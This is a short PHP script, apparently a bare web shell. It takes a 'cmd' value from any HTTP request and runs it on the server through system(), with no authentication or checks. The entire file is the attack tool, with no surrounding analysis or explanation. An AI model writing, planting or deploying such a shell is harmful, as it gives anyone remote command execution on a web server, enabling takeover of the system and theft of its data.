<?php
$cmd = $_REQUEST['cmd'];
if (isset($cmd) && ($cmd!="")){
	system($cmd);
	echo "</div></pre>";
}
?>